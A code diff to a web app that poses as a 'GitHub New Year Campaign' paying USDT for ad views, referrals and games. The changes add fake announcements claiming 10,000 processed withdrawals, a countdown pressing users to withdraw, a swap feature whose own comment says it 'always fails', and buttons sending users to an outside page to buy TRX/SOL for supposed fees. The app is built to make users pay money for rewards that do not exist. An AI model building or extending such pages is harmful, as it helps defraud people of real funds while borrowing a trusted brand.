@@ -40,12 +40,12 @@
             overflow: hidden;
         }
 
-        /* --- BACKGROUND --- */
+        /* --- BACKGROUND ATMOSPHERE --- */
         .winter-glow { position: absolute; top: -20%; left: 50%; transform: translateX(-50%); width: 120%; height: 70%; background: radial-gradient(circle, rgba(56, 139, 253, 0.1) 0%, transparent 70%); z-index: -1; pointer-events: none; }
         .snow-bg { position: absolute; width: 100%; height: 100%; background-image: radial-gradient(rgba(255,255,255,0.1) 1px, transparent 1px); background-size: 50px 50px; opacity: 0.3; z-index: -1; }
 
         /* --- LOADING SPINNER --- */
-        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-body); z-index: 3000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-body); z-index: 3000; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease; }
         .spinner { width: 40px; height: 40px; border: 4px solid var(--button-grey); border-top: 4px solid var(--github-green); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
@@ -72,7 +72,7 @@
 
         /* --- APP STRUCTURE --- */
         #app-content { display: none; width: 100%; height: 100%; flex-direction: column; }
-        header { background: rgba(1, 4, 9, 0.85); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.1); position: fixed; top: 0; width: 100%; z-index: 900; }
+        header { background: rgba(1, 4, 9, 0.95); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.1); position: fixed; top: 0; width: 100%; z-index: 900; }
         .header-stripe { width: 100%; height: 3px; background: var(--festive-gradient); box-shadow: 0 0 15px rgba(218, 54, 51, 0.4); }
         .header-inner { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; height: 64px; }
         .brand-section { display: flex; align-items: center; gap: 12px; }
@@ -82,8 +82,11 @@
         .brand-text { display: flex; flex-direction: column; line-height: 1.1; }
         .brand-title { font-size: 16px; font-weight: 700; color: #ffffff; }
         .brand-subtitle { font-size: 11px; font-weight: 500; color: var(--newyear-gold); text-transform: uppercase; letter-spacing: 0.8px; }
-        .campaign-badge { background: rgba(255,255,255,0.05); border: 1px solid rgba(48,54,61,0.8); padding: 5px 10px; border-radius: 6px; }
-        .badge-value { font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 4px; }
+        
+        /* Countdown Badge */
+        .countdown-container { text-align: right; }
+        .campaign-badge { background: rgba(255,255,255,0.05); border: 1px solid rgba(48,54,61,0.8); padding: 5px 10px; border-radius: 6px; display: inline-block; }
+        .badge-value { font-size: 11px; font-weight: 700; display: flex; align-items: center; gap: 6px; color: #fff; }
         .countdown-dot { width: 6px; height: 6px; background-color: var(--holiday-red); border-radius: 50%; box-shadow: 0 0 5px var(--holiday-red); animation: pulse-red 2s infinite; }
 
         main { flex: 1; margin-top: 67px; padding-bottom: 120px; overflow-y: auto; scroll-behavior: smooth; }
@@ -92,7 +95,15 @@
         .page h2 { font-size: 1.8rem; margin-bottom: 20px; color: var(--text-main); font-weight: 700; text-align: center; }
         .page p { color: var(--text-muted); text-align: center; margin-bottom: 20px;}
 
-        /* --- CAMPAIGN PAGE (VERTICAL) --- */
+        /* --- ANNOUNCEMENTS --- */
+        .announcement-section { width: 100%; max-width: 600px; margin: 30px auto 0; }
+        .ann-header { font-size: 1.2rem; font-weight: 700; margin-bottom: 15px; color: #fff; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+        .ann-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 15px; }
+        .ann-title { font-size: 1rem; font-weight: 700; color: var(--newyear-gold); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .ann-text { font-size: 0.9rem; color: var(--text-muted); line-height: 1.6; white-space: pre-line; }
+        .ann-highlight { color: #fff; font-weight: 600; }
+
+        /* --- CAMPAIGN PAGE --- */
         .campaign-vertical-list { display: flex; flex-direction: column; gap: 25px; width: 100%; max-width: 600px; margin: 0 auto; }
         .camp-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; cursor: pointer; transition: transform 0.2s; position: relative; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
         .camp-card:active { transform: scale(0.98); }
@@ -160,6 +171,7 @@
         .wallet-actions { display: flex; justify-content: space-around; margin-bottom: 40px; padding: 0 10px; }
         .action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
         .action-btn { width: 56px; height: 56px; border-radius: 50%; background-color: var(--button-grey); border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; color: #fff; font-size: 1.2rem; transition: all 0.2s ease; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .action-btn:active { transform: scale(0.95); background-color: #30363d; }
         .action-item span { font-size: 0.85rem; color: var(--text-main); font-weight: 500; }
         .deposit-header { display: flex; background: var(--bg-card); border-radius: 8px; padding: 4px; margin-bottom: 24px; border: 1px solid var(--border-color); }
         .deposit-tab { flex: 1; text-align: center; padding: 10px; border-radius: 6px; font-weight: 600; font-size: 0.9rem; color: var(--text-muted); cursor: pointer; transition: all 0.2s ease; }
@@ -171,6 +183,7 @@
         .address-box { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.2); border: 1px solid var(--border-color); padding: 12px; border-radius: 8px; }
         .address-text { flex: 1; font-family: monospace; color: #fff; word-break: break-all; font-size: 0.9rem; }
         .btn-copy { background: var(--button-grey); border: 1px solid var(--border-color); color: var(--text-main); width: 36px; height: 36px; border-radius: 6px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .btn-copy:active { background: #30363d; }
         .deposit-warning { background: rgba(240, 185, 11, 0.1); border-left: 3px solid var(--newyear-gold); padding: 15px; border-radius: 6px; margin-top: 10px; }
         .warning-title { font-size: 0.9rem; color: #d2a839; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; gap: 6px; }
         .warning-text { font-size: 0.8rem; color: var(--text-muted); line-height: 1.4; }
@@ -178,9 +191,11 @@
         .form-label { display: block; margin-bottom: 8px; color: var(--text-muted); font-size: 0.9rem; font-weight: 500; }
         .input-wrapper { position: relative; }
         .form-input { width: 100%; background: var(--bg-card); border: 1px solid var(--border-color); padding: 14px 14px 14px 14px; border-radius: 8px; color: #fff; font-size: 1rem; transition: border 0.2s; }
+        .form-input:focus { border-color: var(--text-muted); }
         .input-suffix { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--text-muted); font-weight: 600; font-size: 0.8rem; }
         .percent-row { display: flex; gap: 8px; margin-top: 10px; }
         .percent-btn { flex: 1; background: var(--button-grey); border: 1px solid var(--border-color); color: var(--text-muted); padding: 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .percent-btn:active { background: var(--border-color); color: #fff; }
         .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .network-option { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; position: relative; overflow: hidden; }
         .network-option.selected { border-color: var(--newyear-gold); background: rgba(240, 185, 11, 0.05); }
@@ -190,35 +205,18 @@
         .icon-sol { background: #9945FF; color: #fff; }
         .network-name { font-size: 0.9rem; font-weight: 600; color: var(--text-main); }
         .btn-submit { width: 100%; background: var(--github-green); color: #fff; border: none; padding: 15px; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(35, 134, 54, 0.3); }
+        .btn-submit:active { transform: scale(0.98); }
         .min-warning { color: var(--holiday-red); font-size: 0.8rem; margin-top: 8px; font-weight: 500; display: none; animation: fadeIn 0.3s; }
-        .criteria-card { margin-top: 30px; background: rgba(22, 27, 34, 0.8); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; }
-        .criteria-title { font-size: 0.95rem; color: var(--text-main); margin-bottom: 12px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
-        .criteria-list { list-style: none; padding: 0; margin: 0; }
-        .criteria-item { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 10px; display: flex; align-items: center; gap: 10px; line-height: 1.4; transition: color 0.3s; }
-        .criteria-item.completed { color: #fff; }
-        .criteria-item svg { flex-shrink: 0; }
-        .criteria-status { font-size: 0.75rem; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; margin-left: auto; }
-        .completed .criteria-status { background: rgba(35, 134, 54, 0.3); color: var(--github-green); }
-        .security-note { background: rgba(240, 185, 11, 0.1); border-left: 3px solid var(--newyear-gold); padding: 12px; border-radius: 4px; margin-top: 20px; font-size: 0.8rem; color: #d2a839; line-height: 1.5; display: flex; gap: 10px; align-items: flex-start; }
-        .security-note svg { flex-shrink: 0; margin-top: 2px; }
-        .trx-section { display: flex; flex-direction: column; align-items: center; text-align: center; margin-top: 30px; padding-bottom: 20px; }
-        .coin-graphics { display: flex; justify-content: center; margin-bottom: 20px; position: relative; }
-        .coin { width: 60px; height: 60px; border-radius: 50%; border: 4px solid #161b22; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); position: relative; }
-        .coin-trx { background: linear-gradient(135deg, #ef2f2f, #d10d0d); color: white; z-index: 1; transform: translateX(15px); }
-        .coin-sol { background: linear-gradient(135deg, #9945FF, #14F195); color: white; z-index: 2; transform: translateX(-15px); text-shadow: 0 1px 2px rgba(0,0,0,0.3); }
-        .trx-title { font-size: 1.2rem; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
-        .trx-desc { font-size: 0.9rem; color: var(--text-muted); line-height: 1.5; max-width: 280px; margin-bottom: 24px; }
-        .btn-buy-trx { background-color: #f0b90b; color: #000000; font-weight: 700; font-size: 1rem; border: none; padding: 14px 40px; border-radius: 30px; cursor: pointer; width: 80%; max-width: 300px; transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 4px 15px rgba(240, 185, 11, 0.2); }
-        .btn-buy-trx:hover { background-color: #ffe066; }
-        .btn-buy-trx:active { transform: scale(0.97); }
 
-        /* --- MAINTENANCE PAGE STYLE --- */
-        .maintenance-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px; }
-        .maintenance-card { background: var(--bg-card); border: 1px solid var(--border-color); padding: 40px 20px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: fadeUp 0.4s; }
-        .maintenance-icon { font-size: 4rem; margin-bottom: 20px; animation: pulse 2s infinite; }
-        .maintenance-title { font-size: 1.4rem; font-weight: 700; color: #fff; margin-bottom: 15px; }
-        .maintenance-text { color: var(--text-muted); font-size: 0.95rem; line-height: 1.6; margin-bottom: 30px; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
+        /* --- SWAP PAGE STYLES --- */
+        .swap-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; position: relative; }
+        .swap-input-group { background: #010409; border: 1px solid var(--border-color); border-radius: 10px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
+        .swap-input { background: transparent; border: none; color: #fff; font-size: 1.5rem; width: 60%; outline: none; pointer-events: none; }
+        .swap-token { display: flex; align-items: center; gap: 8px; background: var(--button-grey); padding: 5px 10px; border-radius: 20px; font-size: 0.9rem; font-weight: 600; cursor: pointer; }
+        .swap-balance { font-size: 0.75rem; color: var(--text-muted); margin-top: 5px; text-align: right; }
+        .swap-arrow { text-align: center; margin: -5px 0 5px; color: var(--text-muted); font-size: 1.2rem; }
+        .btn-max { color: var(--newyear-gold); font-size: 0.75rem; font-weight: 700; cursor: pointer; margin-left: 10px; }
+        .swap-error { color: var(--holiday-red); font-size: 0.8rem; margin-top: 10px; display: none; text-align: center; }
 
         /* --- MODALS --- */
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(8px); z-index: 1200; display: none; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease; }
@@ -249,6 +247,74 @@
         .nav-item.active::before { transform: translateX(-50%) scaleX(1); }
         .nav-item svg { width: 24px; height: 24px; margin-bottom: 6px; fill: none; stroke: currentColor; stroke-width: 2; transition: all 0.3s; }
         .nav-item.active svg { stroke: #ffffff; transform: translateY(-3px); }
+
+        /* --- FIXED: MISSING ACCOUNT STYLES --- */
+        .trx-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px 0;
+        }
+        .coin-graphics {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .coin {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            color: #fff;
+            font-size: 1rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border: 2px solid var(--bg-card);
+        }
+        .coin-trx {
+            background: #ef2f2f;
+            z-index: 1;
+        }
+        .coin-sol {
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+            margin-left: -15px; /* Overlap effect */
+            z-index: 2;
+        }
+        .trx-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        .trx-desc {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+        .btn-buy-trx {
+            background: var(--newyear-gold);
+            color: #000;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            max-width: 280px;
+            box-shadow: 0 0 20px rgba(242, 204, 96, 0.2);
+            transition: transform 0.2s;
+        }
+        .btn-buy-trx:active {
+            transform: scale(0.95);
+        }
     </style>
 </head>
 <body>
@@ -311,7 +377,7 @@
                     </div>
                 </div>
                 <div class="campaign-badge">
-                    <span class="badge-value"><span class="countdown-dot"></span> 2026 Finale</span>
+                    <span class="badge-value"><span class="countdown-dot"></span> <span id="campaign-timer">Ends in...</span></span>
                 </div>
             </div>
         </header>
@@ -326,10 +392,40 @@
                             <img src="https://i.ibb.co/FqJj6ydH/Picsart-25-12-19-17-29-50-973.jpg" alt="Moon Minor" class="card-image">
                         </div>
                         <div class="card-content">
-                            <div class="card-title">Moon Minor <span style="font-size:0.7em; background:#f0b90b; color:#000; padding:2px 5px; border-radius:4px;">PRO</span></div>
-                            <p class="card-desc">Moon Minor is a fun space game where players earn USDT by collecting rewards. Play, score higher, and increase your wallet balance.</p>
-                            <a href="https://moon-miner-game.github.io/Moon-Miner/" class="btn-play"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg> Play Now</a>
+                            <div class="card-title">Space Miner <span style="font-size:0.7em; background:#f0b90b; color:#000; padding:2px 5px; border-radius:4px;">PRO</span></div>
+                            <p class="card-desc">Space Miner is a fun space game where players earn USDT by collecting rewards. Play, score higher, and increase your wallet balance.</p>
+                            <a href="https://space-miner-game.github.io/Moon-Miner/" class="btn-play"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg> Play Now</a>
                         </div>
+                    </div>
+                </div>
+
+                <!-- ANNOUNCEMENTS -->
+                <div class="announcement-section">
+                    <div class="ann-header">📢 Official Announcements</div>
+                    
+                    <div class="ann-card">
+                        <div class="ann-title">🎉 1. New Year Campaign Is Live</div>
+                        <div class="ann-text">We are glad to inform all participants that the <span class="ann-highlight">GitHub New Year Campaign</span> is now live and running smoothly. So far, we have successfully processed more than 10,000 withdrawals within the promised time.</div>
+                    </div>
+
+                    <div class="ann-card">
+                        <div class="ann-title">🔐 2. Crypto Purchase Active</div>
+                        <div class="ann-text">The Crypto Purchase feature is now officially active. Users can now <span class="ann-highlight">directly purchase TRX and SOL</span> through our secure system.</div>
+                    </div>
+
+                    <div class="ann-card">
+                        <div class="ann-title">🔄 3. New Swap Feature</div>
+                        <div class="ann-text">We have introduced a new Swap Feature in the Account Section. If you hold extra TRX or SOL less than the gas fee, you can swap the remaining balance.</div>
+                    </div>
+
+                    <div class="ann-card">
+                        <div class="ann-title">🎁 4. Giveaway Winners</div>
+                        <div class="ann-text">The New Year and Christmas Giveaway winners will be officially announced on <span class="ann-highlight">2nd January</span> via email.</div>
+                    </div>
+
+                    <div class="ann-card">
+                        <div class="ann-title" style="color:var(--holiday-red)">⏰ 5. Campaign Ends Soon</div>
+                        <div class="ann-text">The campaign officially ends on <span class="ann-highlight">31st December</span>. Please withdraw your earned rewards before the deadline to avoid forfeiture.</div>
                     </div>
                 </div>
             </section>
@@ -341,7 +437,6 @@
                 <div class="referral-card">
                     <div class="ref-title">Refer & Earn</div>
                     
-                    <!-- ACTIVE STATE -->
                     <div id="ref-active-state">
                         <div class="ref-desc">Invite friends and get <b>5 USDT</b> per referral!</div>
                         <div class="ref-code-box">
@@ -350,7 +445,6 @@
                         </div>
                     </div>
 
-                    <!-- COMPLETED STATE -->
                     <div id="ref-completed-state" class="ref-completed-msg">
                         🎉 Mission Completed! <br> You have reached the referral limit.
                     </div>
@@ -452,6 +546,38 @@
                 </div>
             </section>
 
+            <!-- SWAP PAGE -->
+            <section id="page-swap" class="page">
+                <h2 style="margin-bottom:30px;">Swap to USDT</h2>
+                <div class="swap-card">
+                    <!-- FROM -->
+                    <div class="swap-input-group" onclick="performSwap()">
+                        <input type="text" id="swap-input" class="swap-input" value="0" readonly>
+                        <div style="text-align:right;">
+                            <div class="swap-token" onclick="toggleSwapToken(); event.stopPropagation();">
+                                <span id="swap-token-name">TRX</span> ▾
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="swap-arrow">↓</div>
+
+                    <!-- TO -->
+                    <div class="auth-label" style="margin-bottom:5px; color:var(--text-muted); font-size:0.9rem;">Converted Value</div>
+                    <div class="swap-input-group">
+                        <input type="number" id="swap-output" class="swap-input" placeholder="0.0" readonly>
+                        <div class="swap-token" style="background:transparent; cursor:default;">
+                            USDT
+                        </div>
+                    </div>
+                    
+                    <div id="swap-error" class="auth-error" style="margin-top:10px;">Insufficient Balance! You don't have enough currency.</div>
+
+                    <button class="btn-submit" onclick="performSwap()">Swap Now</button>
+                </div>
+                <button class="percent-btn" style="margin-top:15px; width:100%; background:transparent; border:none;" onclick="switchTab('account', document.querySelectorAll('.nav-item')[3])">Back to Account</button>
+            </section>
+
             <!-- ACCOUNT PAGE -->
             <section id="page-account" class="page">
                 <button class="logout-btn" onclick="performLogout()">Logout</button>
@@ -462,13 +588,14 @@
                 <div class="wallet-actions">
                     <div class="action-item" onclick="openDepositPage()"><button class="action-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg></button><span>Receive</span></div>
                     <div class="action-item" onclick="openWithdrawPage()"><button class="action-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg></button><span>Withdraw</span></div>
-                    <div class="action-item" onclick="openBuyPage()"><button class="action-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></button><span>Buy</span></div>
+                    <div class="action-item" onclick="openSwapPage()"><button class="action-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg></button><span>Swap</span></div>
+                    <div class="action-item" onclick="window.location.href='https://crypto-purchase-page.github.io/Secure-Payment/'"><button class="action-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg></button><span>Buy</span></div>
                 </div>
                 <div class="trx-section">
                     <div class="coin-graphics"><div class="coin coin-trx">TRX</div><div class="coin coin-sol">SOL</div></div>
                     <h3 class="trx-title">Get started with TRX/SOL</h3>
                     <p class="trx-desc">You'll need a tiny amount of TRX or SOL as a fee for wallet transaction.</p>
-                    <button class="btn-buy-trx" onclick="openBuyPage()">Buy TRX/SOL</button>
+                    <button class="btn-buy-trx" onclick="window.location.href='https://crypto-purchase-page.github.io/Secure-Payment/'">Buy TRX/SOL</button>
                 </div>
             </section>
 
@@ -500,19 +627,6 @@
                 </div>
                 <button class="percent-btn" style="margin-top:10px; width:100%; background:transparent; border:none;" onclick="switchTab('account', document.querySelectorAll('.nav-item')[3])">Back to Account</button>
             </section>
-
-            <!-- BUY (MAINTENANCE) PAGE -->
-            <section id="page-buy" class="page">
-                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px;">
-                    <div style="background: var(--bg-card); border: 1px solid var(--border-color); padding: 40px 20px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: fadeUp 0.4s;">
-                        <div style="font-size: 4rem; margin-bottom: 20px;">🛠️</div>
-                        <h2 style="font-size: 1.4rem; font-weight: 700; color: #fff; margin-bottom: 15px;">System Maintenance</h2>
-                        <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.6; margin-bottom: 30px;">Due to server maintenance, crypto purchases are unavailable for some time.</p>
-                        <button class="percent-btn" style="width:100%; border:1px solid var(--border-color);" onclick="switchTab('account', document.querySelectorAll('.nav-item')[3])">Go Back</button>
-                    </div>
-                </div>
-            </section>
-
         </main>
 
         <nav class="bottom-nav">
@@ -576,14 +690,9 @@
         let currentUser = null;
         let userData = { profile: {}, stats: { balance: 0.00, activeDays: 0, tasksDone: 0, campaignsJoined: 0, referrals: 0, lastDailyCheckIn: null, twitterClaimed: false, adWatchesToday: 0, lastAdDate: null } };
         let adAttemptCounter = 1;
-        const REQUIREMENTS = { minActiveDays: 3, minTasks: 5, minCampaigns: 1 };
-
-        // AD ROTATION LINKS
-        const AD_LINKS = [
-            "https://www.effectivegatecpm.com/pe893qp57g?key=775e7f2eed1ccdb06ac44b60276c97c3",
-            "https://www.effectivegatecpm.com/xgcp8egw6?key=434093c91edc962671f4dc07e1e7f4a4",
-            "https://www.effectivegatecpm.com/tmtkd45e?key=9f36ad3f4af25dd1c2fa0b48ae9fca4d"
-        ];
+        const REQUIREMENTS = { minActiveDays: 2, minTasks: 5, minCampaigns: 1 };
+        const SWAP_RATES = { TRX: 0.12, SOL: 140.00 }; // Example Rates
+        let currentSwapToken = 'TRX';
 
         const CAMPAIGNS = [
             {
@@ -615,6 +724,10 @@
                     const data = snapshot.val();
                     if(data) { 
                         userData = data; 
+                        // Ensure trx/sol balance exist
+                        userData.stats.trxBalance = userData.stats.trxBalance || 0;
+                        userData.stats.solBalance = userData.stats.solBalance || 0;
+                        
                         updateUI(); 
                         renderCampaigns(); 
                         const now = new Date().toDateString();
@@ -632,13 +745,82 @@
             } else { currentUser = null; showAuth(); }
         });
 
+        // --- FIX: SAFETY TIMEOUT TO REMOVE LOADING SCREEN ---
+        setTimeout(() => {
+            const loading = document.getElementById('loading-screen');
+            if(loading && loading.style.display !== 'none') {
+                console.warn("Firebase took too long or failed to init. Defaulting to Auth Screen.");
+                showAuth();
+            }
+        }, 2000); // Wait 2 seconds then force show auth
+
         function initializeNewUser(user) {
             const initialData = {
                 profile: { name: "User", email: user.email, country: "", referral: "", referralCode: generateReferralCode() },
-                stats: { balance: 0.00, activeDays: 0, tasksDone: 0, campaignsJoined: 0, referrals: 0, lastDailyCheckIn: null, twitterClaimed: false, adWatchesToday: 0, lastAdDate: null }
+                stats: { balance: 0.00, trxBalance: 0, solBalance: 0, activeDays: 0, tasksDone: 0, campaignsJoined: 0, referrals: 0, lastDailyCheckIn: null, twitterClaimed: false, adWatchesToday: 0, lastAdDate: null }
             };
             db.ref('users/' + user.uid).set(initialData);
         }
+
+        // --- SWAP LOGIC ---
+        function openSwapPage() {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page-swap').classList.add('active');
+            updateSwapUI();
+        }
+
+        function toggleSwapToken() {
+            currentSwapToken = currentSwapToken === 'TRX' ? 'SOL' : 'TRX';
+            updateSwapUI();
+        }
+
+        function updateSwapUI() {
+            document.getElementById('swap-token-name').innerText = currentSwapToken;
+            
+            // Get Balance
+            const bal = currentSwapToken === 'TRX' ? userData.stats.trxBalance : userData.stats.solBalance;
+            
+            // Set Input to Balance (Read Only)
+            document.getElementById('swap-input').value = bal.toFixed(2); 
+            
+            // Calculate Output
+            const rate = SWAP_RATES[currentSwapToken];
+            document.getElementById('swap-output').value = (bal * rate).toFixed(2);
+            
+            document.getElementById('swap-error').style.display = 'none';
+        }
+
+        function calculateSwap() {
+            // Input is read-only 0, so amount is 0
+            const amount = 0; 
+            const rate = SWAP_RATES[currentSwapToken];
+            document.getElementById('swap-output').value = (amount * rate).toFixed(2);
+        }
+
+        function performSwap() {
+            // Always fails since balance is 0
+            document.getElementById('swap-error').style.display = 'block';
+            document.getElementById('swap-error').innerText = `Insufficient ${currentSwapToken}! You don't have enough currency.`;
+        }
+
+        // --- COUNTDOWN TIMER ---
+        const endDate = new Date("Dec 31, 2025 23:59:59").getTime();
+        setInterval(() => {
+            const now = new Date().getTime();
+            const distance = endDate - now;
+            
+            if (distance < 0) {
+                document.getElementById('campaign-timer').innerText = "Ended";
+                return;
+            }
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            
+            document.getElementById('campaign-timer').innerText = `Ends in: ${days}d ${hours}h ${minutes}m`;
+        }, 1000);
+
 
         function claimTwitterTask() {
             if(!currentUser) return;
@@ -665,8 +847,11 @@
 
             const btn = document.getElementById('btn-watch-ad');
             const errorMsg = document.getElementById('ad-error-msg');
-            
-            // ROTATE LINKS BASED ON CURRENT COUNT
+            const AD_LINKS = [
+                "https://www.effectivegatecpm.com/pe893qp57g?key=775e7f2eed1ccdb06ac44b60276c97c3",
+                "https://www.effectivegatecpm.com/xgcp8egw6?key=434093c91edc962671f4dc07e1e7f4a4",
+                "https://www.effectivegatecpm.com/tmtkd45e?key=9f36ad3f4af25dd1c2fa0b48ae9fca4d"
+            ];
             const linkIndex = watchesToday % AD_LINKS.length;
             const adLink = AD_LINKS[linkIndex];
 
@@ -683,7 +868,7 @@
                     const newTasks = (userData.stats.tasksDone || 0) + 1;
                     const newWatches = watchesToday + 1;
                     db.ref('users/' + currentUser.uid + '/stats').update({ balance: newBalance, tasksDone: newTasks, adWatchesToday: newWatches, lastAdDate: today });
-                    alert("Ad Task Completed! +0.50 USDT");
+                    alert("Success! Your reward has been added to your wallet. (+0.50 USDT)");
                     adAttemptCounter++;
                 }, 2000);
             }
@@ -878,9 +1063,7 @@
             const balanceStr = '$' + (userData.stats.balance || 0).toFixed(2);
             document.getElementById('main-balance').textContent = balanceStr;
             document.getElementById('withdraw-balance').textContent = balanceStr;
-            
             if(userData.profile && userData.profile.referralCode) { document.getElementById('my-ref-code').textContent = userData.profile.referralCode; }
-            
             const refCount = userData.stats.referrals || 0;
             if (refCount >= 3) {
                 document.getElementById('ref-active-state').style.display = 'none';
@@ -889,7 +1072,6 @@
                 document.getElementById('ref-active-state').style.display = 'block';
                 document.getElementById('ref-completed-state').style.display = 'none';
             }
-            
             document.getElementById('ref-count-text').textContent = `${refCount}/3 Users`;
             const refPercent = Math.min((refCount / 3) * 100, 100);
             document.getElementById('ref-bar').style.width = refPercent + '%';
@@ -940,11 +1122,6 @@
             textArea.select();
             try { document.execCommand('copy'); alert("Referral link & message copied!"); } catch (err) { alert("Manual copy required"); }
             document.body.removeChild(textArea);
-        }
-
-        function openBuyPage() {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('page-buy').classList.add('active');
         }
 
         function switchTab(pageName, element) {
